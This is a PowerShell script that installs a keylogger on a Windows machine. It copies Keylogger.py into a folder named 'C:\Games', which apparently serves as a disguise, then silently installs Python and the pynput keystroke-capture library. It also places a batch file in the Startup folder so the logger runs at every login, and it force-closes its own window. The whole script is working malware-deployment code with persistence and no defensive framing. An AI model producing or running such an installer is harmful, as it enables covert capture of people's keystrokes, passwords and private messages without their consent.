# Set the source and destination paths for Keylogger.py
$keyloggerSourcePath = "C:\Keylogger\Keylogger.py"
$gamesFolderPath = "C:\Games"
$keyloggerDestinationPath = "$gamesFolderPath\Keylogger.py"

# Create the Games folder if it doesn't exist
if (-Not (Test-Path -Path $gamesFolderPath)) {
    Write-Output "Creating Games folder at C:\..."
    New-Item -Path $gamesFolderPath -ItemType Directory
}

# Copy Keylogger.py to the Games folder
Write-Output "Copying Keylogger.py to $keyloggerDestinationPath..."
Copy-Item -Path $keyloggerSourcePath -Destination $keyloggerDestinationPath

# Set the download URL and the installation path
$pythonInstallerUrl = "https://www.python.org/ftp/python/3.10.5/python-3.10.5-amd64.exe"
$installerPath = "$env:TEMP\python-installer.exe"
$pythonInstallPath = "C:\Python310"

# Check if Python is already installed
$pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Path

if ($pythonPath) {
    Write-Output "Python is already installed at $pythonPath. Checking for pynput..."
} else {
    # Download the Python installer
    Write-Output "Downloading Python installer..."
    Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $installerPath

    # Install Python silently
    Write-Output "Installing Python..."
    Start-Process -FilePath $installerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 TargetDir=$pythonInstallPath" -Wait

    # Clean up
    Remove-Item $installerPath

    # Verify installation
    Write-Output "Verifying Python installation..."
    $pythonPath = "$pythonInstallPath\python.exe"
    if (Test-Path $pythonPath) {
        Write-Output "Python installed successfully at $pythonInstallPath"
    } else {
        Write-Output "Python installation failed."
        exit
    }

    # Add Python to system PATH (this step might require a restart to take effect)
    $env:Path += ";$pythonInstallPath;$pythonInstallPath\Scripts"
    [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Machine)
}

# Check if pynput is already installed
$pynputInstalled = & $pythonPath -m pip show pynput -ErrorAction SilentlyContinue

if ($pynputInstalled) {
    Write-Output "pynput is already installed. Exiting the script."
    exit
} else {
    # Install pynput using pip
    Write-Output "Installing pynput..."
    $pipPath = "$pythonInstallPath\Scripts\pip.exe"
    Start-Process -FilePath $pipPath -ArgumentList "install pynput" -Wait
    Write-Output "pynput installation completed."
}

# Copy run_all.bat to startup folder
Write-Output "Copying run_all.bat to startup folder..."
$runAllBatPath = "C:\Keylogger\run.bat"
$startupFolderPath = [System.Environment]::GetFolderPath('Startup')
Copy-Item -Path $runAllBatPath -Destination $startupFolderPath

Write-Output "run_all.bat has been copied to the startup folder."

# Close PowerShell and Command Prompt
Write-Output "Exiting..."
Stop-Process -Id $PID -Force

# Alternatively, use `exit` if `Stop-Process` doesn't work
exit
